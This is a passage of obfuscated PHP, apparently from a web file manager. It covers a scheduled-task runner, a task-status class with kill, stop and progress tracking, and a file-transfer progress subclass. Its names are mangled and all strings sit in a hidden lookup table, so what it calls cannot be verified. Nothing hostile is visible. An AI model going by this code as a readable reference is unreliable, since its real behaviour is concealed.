$ãøùáÕÍ) { return !0; } break; case $¢Òóàõ¨[1643]: if (time() - $§é¸²·› < 3600 * 24 * 7) { return !1; } $˜ÛÍ‹Šã = date($¢Òóàõ¨[1644]) == 0 ? 7 : date($¢Òóàõ¨[1644]); if ($İã°ü¹˜[$¢Òóàõ¨[1643]] == $˜ÛÍ‹Šã && $ãøùáÕÍ) { return !0; } break; case $¢Òóàõ¨[1636]: if (time() - $§é¸²·› < 3600 * 24) { return !1; } if ($ãøùáÕÍ) { return !0; } break; case $¢Òóàõ¨[1645]: if (time() - $§é¸²·› >= floatval($İã°ü¹˜[$¢Òóàõ¨[1645]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $š¯€É­Ó =& $_SERVER[Å¶¨Şêº]; static $Ô–Çì¸ = 0; $Ìù·•Ää = 300; if (!$Ô–Çì¸) { $Ô–Çì¸ = time(); } if (time() - $Ô–Çì¸ < $Ìù·•Ää) { return; } $Ô–Çì¸ = time(); $°‘üÕó¸ = Model($š¯€É­Ó[513])->db($š¯€É­Ó[12]); if ($°‘üÕó¸) { $°‘üÕó¸->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($š¯€É­Ó[1646], $š¯€É­Ó[1647]); die; } } public static function taskRun($šÏÊÔ‡ñ) { $®ƒ„Ã÷ =& $_SERVER[Å¶¨Şêº]; self::log($®ƒ„Ã÷[1648] . $šÏÊÔ‡ñ[$®ƒ„Ã÷[408]] . $®ƒ„Ã÷[1649] . $šÏÊÔ‡ñ[$®ƒ„Ã÷[42]] . $®ƒ„Ã÷[1650] . $šÏÊÔ‡ñ[$®ƒ„Ã÷[1651]]); Model($®ƒ„Ã÷[1632])->run($šÏÊÔ‡ñ[$®ƒ„Ã÷[408]]); $÷ùäÔ›Ó = timeFloat(); $¬å¢âŒ˜ = $®ƒ„Ã÷[12]; switch ($šÏÊÔ‡ñ[$®ƒ„Ã÷[43]]) { case $®ƒ„Ã÷[317]: $€½‡µ¾Ä = url_request($šÏÊÔ‡ñ[$®ƒ„Ã÷[1651]], $®ƒ„Ã÷[241], !1, !1, !1, !1, 10); if ($€½‡µ¾Ä[$®ƒ„Ã÷[747]]) { $¬å¢âŒ˜ = strlen($€½‡µ¾Ä[$®ƒ„Ã÷[1200]]); } break; case $®ƒ„Ã÷[240]: $¬å¢âŒ˜ = Hook::apply($šÏÊÔ‡ñ[$®ƒ„Ã÷[1651]]); default: break; } Model($®ƒ„Ã÷[1652])->add(array($®ƒ„Ã÷[1653] => $®ƒ„Ã÷[12], $®ƒ„Ã÷[1654] => $®ƒ„Ã÷[209], $®ƒ„Ã÷[43] => $®ƒ„Ã÷[1655] . $šÏÊÔ‡ñ[$®ƒ„Ã÷[408]], $®ƒ„Ã÷[1656] => json_encode(array($®ƒ„Ã÷[42] => $šÏÊÔ‡ñ[$®ƒ„Ã÷[42]], $®ƒ„Ã÷[1657] => timeFloat() - $÷ùäÔ›Ó, $®ƒ„Ã÷[303] => $¬å¢âŒ˜)))); $¨›Ô‰³ = $¬å¢âŒ˜ ? $®ƒ„Ã÷[1658] . $¬å¢âŒ˜ : $®ƒ„Ã÷[12]; self::log($®ƒ„Ã÷[1659] . $šÏÊÔ‡ñ[$®ƒ„Ã÷[408]] . $®ƒ„Ã÷[175] . $¨›Ô‰³); return !0; } private static function valueGet($áÛÕıû«) { $„®‰¤· =& $_SERVER[Å¶¨Şêº]; $‰ª”Š¸ = $„®‰¤·[1660]; $·Ù³æ›ñ = Model($„®‰¤·[444])->get($áÛÕıû«, $‰ª”Š¸); if (is_null($·Ù³æ›ñ)) { Model($„®‰¤·[444])->set($„®‰¤·[747], $„®‰¤·[99], $‰ª”Š¸); Model($„®‰¤·[444])->set($„®‰¤·[1622], $„®‰¤·[209], $‰ª”Š¸); $·Ù³æ›ñ = Model($„®‰¤·[444])->get($áÛÕıû«, $‰ª”Š¸); } return $·Ù³æ›ñ; } private static function valueSet($™ÚÈÚíé, $·À§ÂÚİ) { $†îÈÇ„ï =& $_SERVER[Å¶¨Şêº]; $ÜÛÈ½¾ = $†îÈÇ„ï[1661]; CacheLock::lock($ÜÛÈ½¾); $»Ÿ’”†Ã = Model($†îÈÇ„ï[444])->set($™ÚÈÚíé, $·À§ÂÚİ, $†îÈÇ„ï[1660]); CacheLock::unlock($ÜÛÈ½¾); return $»Ÿ’”†Ã; } protected static function log($±œœ·Å§) { write_log($±œœ·Å§, $_SERVER[Å¶¨Şêº][1647]); } private static function cacheClear() { $®Ó÷ºĞ =& $_SERVER[Å¶¨Şêº]; Cache::clearMemory(Model($®Ó÷ºĞ[444])->cacheKey($®Ó÷ºĞ[1660])); Cache::clearMemory(Model($®Ó÷ºĞ[444])->cacheKey($®Ó÷ºĞ[1662])); Model($®Ó÷ºĞ[1632])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\163\x74\157\160"; const STATYS_RUNNING = "\x72\165\156\x6e\151\x6e\147"; const STATYS_KILL = "\153\151\154\154"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($Ÿ¸Ì˜­, $’º¼´Àş = '', $îáıÅ±™ = 0, $ØäÏµ® = '') { $—Ş°½®š =& $_SERVER[Å¶¨Şêº]; if (self::get($Ÿ¸Ì˜­)) { return; } $this->task = array($—Ş°½®š[408] => $Ÿ¸Ì˜­, $—Ş°½®š[1663] => USER_ID, $—Ş°½®š[1563] => $ØäÏµ®, $—Ş°½®š[462] => $—Ş°½®š[12], $—Ş°½®š[43] => $’º¼´Àş, $—Ş°½®š[1061] => $—Ş°½®š[12], $—Ş°½®š[784] => $îáıÅ±™, $—Ş°½®š[1664] => 0, $—Ş°½®š[1665] => 0, $—Ş°½®š[1666] => 0, $—Ş°½®š[1667] => timeFloat(), $—Ş°½®š[1668] => 0, $—Ş°½®š[1669] => 0, $—Ş°½®š[1670] => 0, $—Ş°½®š[1671] => 0, $—Ş°½®š[747] => $—Ş°½®š[1622]); $GLOBALS[$—Ş°½®š[1672]] = 1; Hook::bind($—Ş°½®š[1627], array($this, $—Ş°½®š[1673])); Hook::bind($—Ş°½®š[1674], array($this, $—Ş°½®š[1675])); $this->startAfter(); Hook::trigger($—Ş°½®š[1676], $this->task); $this->task[$—Ş°½®š[1669]] = timeFloat(); } public function end($ŸŒ’²âú = '') { $òËÎõ ú =& $_SERVER[Å¶¨Şêº]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$òËÎõ ú[1669]]) { self::valueSet($this->task[$òËÎõ ú[408]], !1); } $this->isEnd = !0; if ($ŸŒ’²âú) { $this->task[$òËÎõ ú[462]] = $ŸŒ’²âú; } self::log($òËÎõ ú[1677] . $this->task[$òËÎõ ú[408]] . $òËÎõ ú[1678] . sprintf($òËÎõ ú[848], timeFloat() - $this->task[$òËÎõ ú[1667]]) . $òËÎõ ú[1679]); Hook::unbind($òËÎõ ú[1627], array($this, $òËÎõ ú[1673])); Hook::unbind($òËÎõ ú[1674], array($this, $òËÎõ ú[1675])); $this->endAfter(); $àÆªÃ¸ = $this->task; $this->task = !1; Hook::trigger($òËÎõ ú[1680], $àÆªÃ¸); } public function update($»Ÿ¶‰¤· = 0, $ù«µ¸Ù = false) { $Š¬¦¥ê› =& $_SERVER[Å¶¨Şêº]; $ò—½ÚÒµ =& $this->task; if (!$ò—½ÚÒµ) { return; } $ò—½ÚÒµ[$Š¬¦¥ê›[1664]] += $»Ÿ¶‰¤·; $ò—½ÚÒµ[$Š¬¦¥ê›[1668]] = timeFloat(); if ($ò—½ÚÒµ[$Š¬¦¥ê›[784]]) { if ($ò—½ÚÒµ[$Š¬¦¥ê›[784]] < $ò—½ÚÒµ[$Š¬¦¥ê›[1664]]) { $ò—½ÚÒµ[$Š¬¦¥ê›[784]] = $ò—½ÚÒµ[$Š¬¦¥ê›[1664]]; } $°â»õØ¹ = timeFloat() - $ò—½ÚÒµ[$Š¬¦¥ê›[1667]] - $ò—½ÚÒµ[$Š¬¦¥ê›[1670]]; if ($°â»õØ¹ <= 0) { $°â»õØ¹ = 0.001; } $ò—½ÚÒµ[$Š¬¦¥ê›[1665]] = $ò—½ÚÒµ[$Š¬¦¥ê›[1664]] / $ò—½ÚÒµ[$Š¬¦¥ê›[784]]; $ò—½ÚÒµ[$Š¬¦¥ê›[1666]] = $ò—½ÚÒµ[$Š¬¦¥ê›[1664]] / $°â»õØ¹; if ($ò—½ÚÒµ[$Š¬¦¥ê›[1665]] > 0) { $ò—½ÚÒµ[$Š¬¦¥ê›[1671]] = $°â»õØ¹ * (1 - $ò—½ÚÒµ[$Š¬¦¥ê›[1665]]) / $ò—½ÚÒµ[$Š¬¦¥ê›[1665]]; } $ò—½ÚÒµ[$Š¬¦¥ê›[1671]] = $ò—½ÚÒµ[$Š¬¦¥ê›[1671]] <= 0 ? 0 : $ò—½ÚÒµ[$Š¬¦¥ê›[1671]]; } $this->updateAfter(); $³ÒÕÙã = 0.2; if (timeFloat() - $ò—½ÚÒµ[$Š¬¦¥ê›[1669]] < $³ÒÕÙã && !$ù«µ¸Ù) { return; } $İê–Ş = self::get($ò—½ÚÒµ[$Š¬¦¥ê›[408]]); $¸¦­çé˜ = $İê–Ş[$Š¬¦¥ê›[747]]; if ($¸¦­çé˜ == self::STATYS_KILL) { $è·Î¼ĞÂ = array($Š¬¦¥ê›[1681] => LNG($Š¬¦¥ê›[1682]), $Š¬¦¥ê›[1210] => !1); Cache::set($Š¬¦¥ê›[1683] . $this->task[$Š¬¦¥ê›[408]], $è·Î¼ĞÂ, 30); $this->onKill(); $this->end(); die; } else { if ($¸¦­çé˜ == self::STATYS_STOP) { $ÊæîÎÓÈ = 2; $İê–Ş[$Š¬¦¥ê›[1670]] += $ÊæîÎÓÈ; self::valueSet($ò—½ÚÒµ[$Š¬¦¥ê›[408]], $İê–Ş); sleep($ÊæîÎÓÈ); $this->update(); return; } } $ò—½ÚÒµ[$Š¬¦¥ê›[747]] = $¸¦­çé˜ ? $¸¦­çé˜ : $ò—½ÚÒµ[$Š¬¦¥ê›[747]]; $ò—½ÚÒµ[$Š¬¦¥ê›[1670]] = $İê–Ş[$Š¬¦¥ê›[1670]] ? $İê–Ş[$Š¬¦¥ê›[1670]] : 0; $ò—½ÚÒµ[$Š¬¦¥ê›[1669]] = timeFloat(); Hook::trigger($Š¬¦¥ê›[1684], $ò—½ÚÒµ); self::valueSet($ò—½ÚÒµ[$Š¬¦¥ê›[408]], $ò—½ÚÒµ); } public function onKillSet($‹ùú‹¸ë, $ó›—ÒÆ¸ = array()) { $this->onKillCall = array($‹ùú‹¸ë, $ó›—ÒÆ¸); } public function onKill() { $è¥¥¤æ =& $_SERVER[Å¶¨Şêº]; self::log($è¥¥¤æ[1677] . $this->task[$è¥¥¤æ[408]] . $è¥¥¤æ[1685]); Hook::trigger($è¥¥¤æ[1686], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($ú°Ä„™Å) { $¨‹¾Ïå =& $_SERVER[Å¶¨Şêº]; Cache::set($¨‹¾Ïå[1683] . $this->task[$¨‹¾Ïå[408]], $ú°Ä„™Å, 60); return $ú°Ä„™Å; } public static function get($’ÍùÂìƒ) { $ÖÁçÑ½Ö =& $_SERVER[Å¶¨Şêº]; $¹½ö®ğç = self::valueGet($’ÍùÂìƒ); if (is_array($¹½ö®ğç) && $¹½ö®ğç[$ÖÁçÑ½Ö[1687]]) { $‹‚¦Ë‚† = ActionApply($¹½ö®ğç[$ÖÁçÑ½Ö[1687]], array($¹½ö®ğç)); $¹½ö®ğç = is_array($‹‚¦Ë‚†) ? $‹‚¦Ë‚† : $¹½ö®ğç; } return $¹½ö®ğç; } public static function listData() { $»½¡âš‰ = self::valueGet(); return array_sort_by($»½¡âš‰, $_SERVER[Å¶¨Şêº][1667], !0); } public static function kill($ĞßÆ˜Â¶) { return self::changeStatus($ĞßÆ˜Â¶, self::STATYS_KILL); } public static function stop($É÷ è·Å) { return self::changeStatus($É÷ è·Å, self::STATYS_STOP); } public static function restart($¦Å Ë¯£) { return self::changeStatus($¦Å Ë¯£, self::STATYS_RUNNING); } public static function killAll() { $¯Ëæï‡ =& $_SERVER[Å¶¨Şêº]; $ê÷ÕŞÀ› = self::listData(); foreach ($ê÷ÕŞÀ› as $ÓÖ—»ºú) { self::kill($ÓÖ—»ºú[$¯Ëæï‡[408]]); } sleep(2); foreach ($ê÷ÕŞÀ› as $ÓÖ—»ºú) { self::valueSet($ÓÖ—»ºú[$¯Ëæï‡[408]], !1); } } private static function changeStatus($òô³‚Ä£, $Ë¿ıí˜î) { $Ö½“ó“£ =& $_SERVER[Å¶¨Şêº]; $Ú¸°Æ¿Ö = self::valueGet($òô³‚Ä£); if (!$Ú¸°Æ¿Ö) { return !1; } $Ú¸°Æ¿Ö[$Ö½“ó“£[747]] = $Ë¿ıí˜î; self::valueSet($òô³‚Ä£, $Ú¸°Æ¿Ö); self::log($Ö½“ó“£[1688] . $Ú¸°Æ¿Ö[$Ö½“ó“£[408]] . $Ö½“ó“£[1689] . $Ë¿ıí˜î); return !0; } public static function valueGet($±ƒ¾Óõ = false) { $å®…°õ± =& $_SERVER[Å¶¨Şêº]; if ($±ƒ¾Óõ) { $À„½ÏŸŸ = Model($å®…°õ±[456])->where(array($å®…°õ±[105] => $±ƒ¾Óõ, $å®…°õ±[43] => $å®…°õ±[1068]))->find(); return $À„½ÏŸŸ ? json_decode($À„½ÏŸŸ[$å®…°õ±[384]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($Ààì³åŸ = false) { $†è÷¤áë =& $_SERVER[Å¶¨Şêº]; $ù•¶ıêœ = array($†è÷¤áë[43] => $†è÷¤áë[1068]); if ($Ààì³åŸ) { $ù•¶ıêœ[$†è÷¤áë[1663]] = $Ààì³åŸ; } $­’İß³Õ = Model($†è÷¤áë[456])->where($ù•¶ıêœ)->select(); $­’İß³Õ = $­’İß³Õ ? $­’İß³Õ : array(); foreach ($­’İß³Õ as $í÷°¸ò„ => $ñ’¿ëığ) { $­’İß³Õ[$í÷°¸ò„] = json_decode($ñ’¿ëığ[$†è÷¤áë[384]], !0); } return $­’İß³Õ; } public static function valueSet($ÀµóâÍ, $Ñªµ£ÓÛ) { $ÅàŒÕê =& $_SERVER[Å¶¨Şêº]; if (!$Ñªµ£ÓÛ) { return Model($ÅàŒÕê[456])->where(array($ÅàŒÕê[105] => $ÀµóâÍ, $ÅàŒÕê[43] => $ÅàŒÕê[1068]))->delete(); } $Éªˆ»×‹ = json_encode($Ñªµ£ÓÛ); if (!$Éªˆ»×‹) { ob_start(); var_dump($Ñªµ£ÓÛ); $¯ß”¶¢ = ob_get_clean(); self::log($ÅàŒÕê[1690] . json_encode_force($¯ß”¶¢)); } if (!$ÀµóâÍ || !$Ñªµ£ÓÛ[$ÅàŒÕê[408]]) { return !1; } $ˆÆ½´•¥ = array($ÅàŒÕê[43] => $ÅàŒÕê[1068], $ÅàŒÕê[1663] => USER_ID, $ÅàŒÕê[105] => $ÀµóâÍ, $ÅàŒÕê[384] => $Éªˆ»×‹); $°´Ì­£ = $ÅàŒÕê[1691]; CacheLock::lock($°´Ì­£); Model($ÅàŒÕê[456])->add($ˆÆ½´•¥, array(), !0); CacheLock::unlock($°´Ì­£); } public static function log($Ã•ûªÚã) { if (!GLOBAL_DEBUG) { return; } write_log($Ã•ûªÚã, $_SERVER[Å¶¨Şêº][1692]); } } class TaskFileTransfer extends Task { protected function startAfter() { $ÇÕçÛéË =& $_SERVER[Å¶¨Şêº]; $¸£ßÈé =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($ÇÕçÛéË[1693], array($this, $ÇÕçÛéË[1694])); Hook::bind($ÇÕçÛéË[1221], array($this, $ÇÕçÛéË[1695])); Hook::bind($ÇÕçÛéË[1696], array($this, $ÇÕçÛéË[1697])); Hook::bind($ÇÕçÛéË[605], array($this, $ÇÕçÛéË[1698])); Hook::bind($ÇÕçÛéË[606], array($this, $ÇÕçÛéË[1699])); Hook::bind($ÇÕçÛéË[611], array($this, $ÇÕçÛéË[1700])); Hook::bind($ÇÕçÛéË[612], array($this, $ÇÕçÛéË[1701])); Hook::bind($ÇÕçÛéË[608], array($this, $ÇÕçÛéË[1702])); Hook::bind($ÇÕçÛéË[609], array($this, $ÇÕçÛéË[1703])); Hook::bind($ÇÕçÛéË[574], array($this, $ÇÕçÛéË[1704])); Hook::bind($ÇÕçÛéË[571], array($this, $ÇÕçÛéË[1704])); Hook::bind($ÇÕçÛéË[576], array($this, $ÇÕçÛéË[1704])); Hook::bind($ÇÕçÛéË[578], array($this, $ÇÕçÛéË[1704])); Hook::bind($ÇÕçÛéË[580], array($this, $ÇÕçÛéË[1704])); Hook::bind($ÇÕçÛéË[1705], array($this, $ÇÕçÛéË[1706])); Hook::bind($ÇÕçÛéË[596], array($this, $ÇÕçÛéË[1707])); $this->sourceModelCopyFlag = !1; Hook::bind($ÇÕçÛéË[1708], array($this, $ÇÕçÛéË[1709])); Hook::bind($ÇÕçÛéË[1710], array($this, $ÇÕçÛéË[1711])); Hook::bind($ÇÕçÛéË[1712], array($this, $ÇÕçÛéË[1713])); $¸£ßÈé[$ÇÕçÛéË[1714]] = LNG($ÇÕçÛéË[1715]); $¸£ßÈé[$ÇÕçÛéË[1716]] = 0; $¸£ßÈé[$ÇÕçÛéË[1717]] = 0; $¸£ßÈé[$ÇÕçÛéË[1061]] = $ÇÕçÛéË[12]; $¸£ßÈé[$ÇÕçÛéË[1718]] = $ÇÕçÛéË[12]; $¸£ßÈé[$ÇÕçÛéË[1719]] = 0; $¸£ßÈé[$ÇÕçÛéË[1720]] = 0; $¸£ßÈé[$ÇÕçÛéË[1721]] = 0; if (!$¸£ßÈé[$ÇÕçÛéË[1563]]) { $¸£ßÈé[$ÇÕçÛéË[1563]] = LNG($ÇÕçÛéË[1722]); } } protected function endAfter() { $ÃÀÉôù™ =& $_SERVER[Å¶¨Şêº]; Hook::unbind($ÃÀÉôù™[1693], array($this, $ÃÀÉôù™[1694])); Hook::unbind($ÃÀÉôù™[1221], array($this, $ÃÀÉôù™[1695])); Hook::unbind($ÃÀÉôù™[1696], array($this, $ÃÀÉôù™[1697])); Hook::unbind($ÃÀÉôù™[605], array($this, $ÃÀÉôù™[1698])); Hook::unbind($ÃÀÉôù™[606], array($this, $ÃÀÉôù™[1699])); Hook::unbind($ÃÀÉôù™[611], array($this, $ÃÀÉôù™[1700])); Hook::unbind($ÃÀÉôù™[612], array($this, $ÃÀÉôù™[1701])); Hook::unbind($ÃÀÉôù™[608], array($this, $ÃÀÉôù™[1702])); Hook::unbind($ÃÀÉôù™[609], array($this, $ÃÀÉôù™[1703])); Hook::unbind($ÃÀÉôù™[574], array($this, $ÃÀÉôù™[1704])); Hook::unbind($ÃÀÉôù™[571], array($this, $ÃÀÉôù™[1704])); Hook::unbind($ÃÀÉôù™[576], array($this, $ÃÀÉôù™[1704])); Hook::unbind($ÃÀÉôù™[578], array($this, $ÃÀÉôù™[1704])); Hook::unbind($ÃÀÉôù™[580], array($this, $ÃÀÉôù™[1704])); Hook::unbind($ÃÀÉôù™[1705], array($this, $ÃÀÉôù™[1706])); Hook::unbind($ÃÀÉôù™[596], array($this, $ÃÀÉôù™[1707])); Hook::unbind($ÃÀÉôù™[1708], array($this, $ÃÀÉôù™[1709])); Hook::unbind($ÃÀÉôù™[1710], array($this, $ÃÀÉôù™[1711])); Hook::unbind($ÃÀÉôù™[1712], array($this, $ÃÀÉôù™[1713])); } public function copyMoveStart($–€½¸³ë, $¯Ñ„’±Ø, $ÃÈµüşß, $¼öÖğÄ×) { $Å¶™ŸÜÑ =& $_SERVER[Å¶¨Şêº]; self::log($Å¶™ŸÜÑ[1723] . $¯Ñ„’±Ø . $Å¶™ŸÜÑ[81] . $¼öÖğÄ×); $«Ã×¤¹§ = rtrim(TEMP_FILES, $Å¶™ŸÜÑ[8]); if (substr($¯Ñ„’±Ø, 0, strlen($«Ã×¤¹§)) == $«Ã×¤¹§) { return; } if (substr($¼öÖğÄ×, 0, strlen($«Ã×¤¹§)) == $«Ã×¤¹§) { return; } $Õ”’ì©Ç =& $this->task; $Õ”’ì©Ç[$Å¶™ŸÜÑ[1724]] = KodIO::transferType($–€½¸³ë, $ÃÈµüşß); $this->update(); } public function updateAfter() { $•‡ÕˆÚŠ =& $_SERVER[Å¶¨Şêº]; $ÕäèÊƒ‡ =& $this->task; if (!$ÕäèÊƒ‡[$•‡ÕˆÚŠ[761]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($ÕäèÊƒ‡[$•‡ÕˆÚŠ[1724]] == $•‡ÕˆÚŠ[1310]) { return; } self::updateTask($ÕäèÊƒ‡); } private static function updateTask(&$Ä½ËâÖØ) { $„‚ò¼÷‘ =& $_SERVER[Å¶¨Şêº]; if ($Ä½ËâÖØ[$„‚ò¼÷‘[1724]] == $„‚ò¼÷‘[1192] || $Ä½ËâÖØ[$„‚ò¼÷‘[1724]] == $„‚ò¼÷‘[118]) { if ($Ä½ËâÖØ[$„‚ò¼÷‘[1718]]) { $Ä½ËâÖØ[$„‚ò¼÷‘[1721]] = $Ä½ËâÖØ[$„‚ò¼÷‘[1720]] + $Ä½ËâÖØ[$„‚ò¼÷‘[1717]]; } } else { if ($Ä½ËâÖØ[$„‚ò¼÷‘[1724]] == $„‚ò¼÷‘[1311]) { if ($Ä½ËâÖØ[$„‚ò¼÷‘[1718]] == $„‚ò¼÷‘[1192]) { $Ä½ËâÖØ[$„‚ò¼÷‘[1721]] = $Ä½ËâÖØ[$„‚ò¼÷‘[1720]] + $Ä½ËâÖØ[$„‚ò¼÷‘[1717]] * 0.5; } else { if ($Ä½ËâÖØ[$„‚ò¼÷‘[1718]] == $„‚ò¼÷‘[118]) { $Ä½ËâÖØ[$„‚ò¼÷‘[1721]] = $Ä½ËâÖØ[$„‚ò¼÷‘[1720]] + $Ä½ËâÖØ[$„‚ò¼÷‘[1716]] * 0.5 + $Ä½ËâÖØ[$„‚ò¼÷‘[1717]] * 0.5; } } } } $Ä½ËâÖØ[$„‚ò¼÷‘[1665]] = $Ä½ËâÖØ[$„‚ò¼÷‘[1721]] / $Ä½ËâÖØ[$„‚ò¼÷‘[761]]; if ($Ä½ËâÖØ[$„‚ò¼÷‘[1665]] > 0) { $†îÆ´åÒ = timeFloat() - $Ä½ËâÖØ[$„‚ò¼÷‘[1667]] - $Ä½ËâÖØ[$„‚ò¼÷‘[1670]]; $Ä½ËâÖØ[$„‚ò¼÷‘[1671]] = $†îÆ´åÒ * (1 - $Ä½ËâÖØ[$„‚ò¼÷‘[1665]]) / $Ä½ËâÖØ[$„‚ò¼÷‘[1665]]; } } public function addPath($ÏçŸƒåà) { $ê±…È—ò =& $_SERVER[Å¶¨Şêº]; if (!$ÏçŸƒåà) { return; } $ ¯ƒí Í =& $this->task; $²ğçäİ = IO::infoWithChildren($ÏçŸƒåà); $¼†±ÎÜ¼ = $ ¯ƒí Í[$ê±…È—ò[1725]] ? $ ¯ƒí Í[$ê±…È—ò[1725]][$ê±…È—ò[1726]] : 0; $ ¯ƒí Í[$ê±…È—ò[1725]] = array($ê±…È—ò[1726] => $¼†±ÎÜ¼ + 1, $ê±…È—ò[429] => $²ğçäİ[$ê±…È—ò[42]], $ê±…È—ò[95] => $²ğçäİ[$ê±…È—ò[95]], $ê±…È—ò[518] => $²ğçäİ[$ê±…È—ò[518]] ? $²ğçäİ[$ê±…È—ò[518]] : $²ğçäİ[$ê±…È—ò[95]]); if ($²ğçäİ[$ê±…È—ò[43]] == $ê±…È—ò[211]) { $ ¯ƒí Í[$ê±…È—ò[784]] += 1; } else { $ ¯ƒí Í[$ê±…È—ò[784]] += $²ğçäİ[$ê±…È—ò[90]][$ê±…È—ò[88]]; if ($²ğçäİ[$ê±…È—ò[411]]) { $ ¯ƒí Í[$ê±…È—ò[784]] += $²ğçäİ[$ê±…È—ò[90]][$ê±…È—ò[89]] + 1; } } $ ¯ƒí Í[$ê±…È—ò[761]] += $²ğçäİ[$ê±…È—ò[87]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($õÈà¼è) { } public function sourceAddHashEnd($î¹Õ¤ÑÊ) { } public function sourceAddFileStart($€±óİã´) { $„Á·€ñ¼ =& $_SERVER[Å¶¨Şêº]; $›²¥ì» =& $this->task; $›²¥ì»[$„Á·€ñ¼[1716]] = $€±óİã´[$„Á·€ñ¼[87]]; $›²¥ì»[$„Á·€ñ¼[1714]] = $€±óİã´[$„Á·€ñ¼[42]]; $›²¥ì»[$„Á·€ñ¼[1061]] = $€±óİã´[$„Á·€ñ¼[42]]; $›²¥ì»[$„Á·€ñ¼[1727]] = $€±óİã´[$„Á·€ñ¼[95]]; $this->update(); } public function sourceAddFileEnd($¦ØĞ¹«‰) { $²–œ¡ƒ¡ =& $_SERVER[Å¶¨Şêº]; $¡•ïß£ =& $this->task; $¡•ïß£[$²–œ¡ƒ¡[1721]] += $¦ØĞ¹«‰[$²–œ¡ƒ¡[87]]; $¡•ïß£[$²–œ¡ƒ¡[1727]] = $¦ØĞ¹«‰[$²–œ¡ƒ¡[95]]; $this->update(1); } public function copyFileStart($Ê›õ•ÈÃ, $í¥±”ßê, $Å ŞÑå‹, $Òªç€å, $Ê”áŞæ…, $¢ÒŠò”É) { $á¦µó‘ =& $_SERVER[Å¶¨Şêº]; $åšÈúùû = $Ê”áŞæ…; if ($åšÈúùû == $GLOBALS[$á¦µó‘[1728]]) { $åšÈúùû = $GLOBALS[$á¦µó‘[1729]]; } $GLOBALS[$á¦µó‘[1729]] = $Ê”áŞæ…; $GLOBALS[$á¦µó‘[1728]] = $¢ÒŠò”É; $÷™Äİ°œ =& $this->task; $÷™Äİ°œ[$á¦µó‘[1714]] = $åšÈúùû; $÷™Äİ°œ[$á¦µó‘[1716]] = (int) $Ê›õ•ÈÃ->size($í¥±”ßê); $÷™Äİ°œ[$á¦µó‘[1717]] = 0; $÷™Äİ°œ[$á¦µó‘[1061]] = $á¦µó‘[12]; $÷™Äİ°œ[$á¦µó‘[1718]] = $á¦µó‘[12]; $÷™Äİ°œ[$á¦µó‘[1719]] = 0; $­óøœñ = $÷™Äİ°œ[$á¦µó‘[1716]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($÷™Äİ°œ[$á¦µó‘[408]] . $á¦µó‘[1730]); if ($­óøœñ && file_exists(get_path_father($Òªç€å))) { Cache::set($÷™Äİ°œ[$á¦µó‘[408]] . $á¦µó‘[1730], $Òªç€å); $÷™Äİ°œ[$á¦µó‘[1687]] = array($á¦µó‘[1731], $á¦µó‘[1732]); } $this->update(0, $­óøœñ); } public static function updateCopyLocalFileSize($§è³ —î) { $Â¥Øï’Ú =& $_SERVER[Å¶¨Şêº]; $­ö¤‹­ù = Cache::get($§è³ —î[$Â¥Øï’Ú[408]] . $Â¥Øï’Ú[1730]); if (!$­ö¤‹­ù || !file_exists($­ö¤‹­ù)) { return $§è³ —î; } $§è³ —î[$Â¥Øï’Ú[1717]] = @filesize($­ö¤‹­ù); $§è³ —î[$Â¥Øï’Ú[1721]] += $§è³ —î[$Â¥Øï’Ú[1717]]; self::updateTask($§è³ —î); return $§è³ —î; } public function copyFileEnd($‡»»–š, $¿ø¶æ±Ç, $À­ø‹£Ü, $ëÊ¾æË, $Å¤ÖÇåà, $Ç½®éûÛ) { $Ü¿¼ğ¥ö =& $_SERVER[Å¶¨Şêº]; $Ó¯í©€± =& $this->task; $Ó¯í©€±[$Ü¿¼ğ¥ö[1717]] = $Ó¯í©€±[$Ü¿¼ğ¥ö[1716]]; $Ó¯í©€±[$Ü¿¼ğ¥ö[1718]] = $Ü¿¼ğ¥ö[12]; unset($Ó¯í©€±[$Ü¿¼ğ¥ö[1687]]); if ($Å¤ÖÇåà == $Ó¯í©€±[$Ü¿¼ğ¥ö[1714]]) { $Ó¯í©€±[$Ü¿¼ğ¥ö[1720]] += $Ó¯í©€±[$Ü¿¼ğ¥ö[1716]]; $Ó¯í©€±[$Ü¿¼ğ¥ö[1721]] = $Ó¯í©€±[$Ü¿¼ğ¥ö[1720]]; $·¿ˆİ­Ê = 1; if (isset($Ó¯í©€±[$Ü¿¼ğ¥ö[1727]]) && $Ó¯í©€±[$Ü¿¼ğ¥ö[1727]] == $¿ø¶æ±Ç) { $·¿ˆİ­Ê = 0; } $this->update($·¿ˆİ­Ê); } else { $this->update(); $Ó¯í©€±[$Ü¿¼ğ¥ö[1717]] = 0; } Cache::remove($Ó¯í©€±[$Ü¿¼ğ¥ö[408]] . $Ü¿¼ğ¥ö[1730]); self::log($Ü¿¼ğ¥ö[1733] . $¿ø¶æ±Ç . $Ü¿¼ğ¥ö[81] . $ëÊ¾æË . $Ü¿¼ğ¥ö[19] . $Å¤ÖÇåà . $Ü¿¼ğ¥ö[1734] . $Ó¯í©€±[$Ü¿¼ğ¥ö[1714]]); } public function updateFileEnd($¥€©Ô§ó, $à¼†Ô¼÷) { $øş¼Û…ø =& $_SERVER[Å¶¨Şêº]; $¹¸†Ì‡‡ =& $this->task; $¹¸†Ì‡‡[$øş¼Û…ø[1714]] = $¥€©Ô§ó; $¹¸†Ì‡‡[$øş¼Û…ø[1716]] = $à¼†Ô¼÷; $¹¸†Ì‡‡[$øş¼Û…ø[1720]] += $à¼†Ô¼÷; $¹¸†Ì‡‡[$øş¼Û…ø[1721]] = $¹¸†Ì‡‡[$øş¼Û…ø[1720]]; $this->update(1); self::log($øş¼Û…ø[1735] . 